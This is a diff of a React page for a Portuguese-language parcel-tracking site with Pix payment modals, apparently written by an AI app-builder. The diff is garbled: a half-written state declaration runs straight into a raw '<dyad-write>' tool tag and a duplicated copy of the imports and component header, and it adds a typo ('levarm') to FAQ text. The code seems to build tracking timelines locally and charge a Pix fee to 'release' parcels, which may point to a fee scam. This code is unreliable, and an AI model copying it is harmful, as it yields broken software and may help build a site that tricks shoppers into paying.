@@ -22,6 +22,32 @@ import loggiLogo from '@/assets/loggi.png';
 import totalExpressLogo from '@/assets/total-express.png';
 
 const Index = () => {
+  const [trackingCode, setTrackingCode]
+<dyad-write path="src/pages/Index.tsx" description="Reenviando o código completo da página principal.">
+"use client";
+
+import React, { useState } from 'react';
+import { motion, AnimatePresence } from 'framer-motion';
+import { Link } from 'react-router-dom';
+import { 
+  Search, Truck, Bell, History, ShieldCheck, HelpCircle, ArrowRight, PackageCheck, Zap, Check, X
+} from 'lucide-react';
+import { Button } from '@/components/ui/button';
+import { AntiFraudModal } from '@/components/AntiFraudModal';
+import { TrackingResult } from '@/components/TrackingResult';
+import { PixModal } from '@/components/PixModal';
+import { PlanPixModal } from '@/components/PlanPixModal';
+import { showSuccess, showError, showLoading, dismissToast } from '@/utils/toast';
+import Logo from '@/components/Logo';
+import { supabase } from '@/integrations/supabase/client';
+import { generateTimeline, type TrackingEvent } from '@/utils/tracking';
+
+import correiosLogo from '@/assets/correios.png';
+import jadlogLogo from '@/assets/jadlog.png';
+import loggiLogo from '@/assets/loggi.png';
+import totalExpressLogo from '@/assets/total-express.png';
+
+const Index = () => {
   const [trackingCode, setTrackingCode] = useState('');
   const [isSearching, setIsSearching] = useState(false);
   const [showResult, setShowResult] = useState(false);
@@ -55,7 +81,7 @@ const Index = () => {
     },
     {
       title: "Código não funciona",
-      content: "É muito comum que os códigos de rastreio levem até 72 horas úteis para começarem a constar no sistema das transportadoras após a loja confirmar o envio. Isso acontece porque o pacote precisa ser fisicamente despachado e 'bipado' na primeira unidade. Se você acabou de receber o código, aguarde um pouco e tente novamente mais tarde. Verifique também se digitou sem espaços extras."
+      content: "É muito comum que os códigos de rastreio levarm até 72 horas úteis para começarem a constar no sistema das transportadoras após a loja confirmar o envio. Isso acontece porque o pacote precisa ser fisicamente despachado e 'bipado' na primeira unidade. Se você acabou de receber o código, aguarde um pouco e tente novamente mais tarde. Verifique também se digitou sem espaços extras."
     },
     {
       title: "Status não atualiza",
@@ -170,7 +196,6 @@ const Index = () => {
 
       setDestInfo({ city: cidade, state: estado, cep, endereco, numero, complemento, bairro });
 
-      // Verificação de taxa via Edge Function (Seguro contra RLS)
       const { data: statusData } = await supabase.functions.invoke('check-pix-status', {
         body: { trackingCode: codeToSearch }
       });
@@ -230,7 +255,7 @@ const Index = () => {
   };
 
   const handleBuyPlan = async (planName: string, amount: number) => {
-    if (amount === 0) return; // Plano gratuito
+    if (amount === 0) return;
     
     const loadingId = showLoading(`Gerando PIX para o plano ${planName}...`);
     try {
@@ -258,7 +283,6 @@ const Index = () => {
 
   const handlePaymentSuccess = () => {
     setIsPixModalOpen(false);
-    // Refaz a busca para atualizar a linha do tempo com a liberação da encomenda!
     performSearch(trackingCode);
   };
 
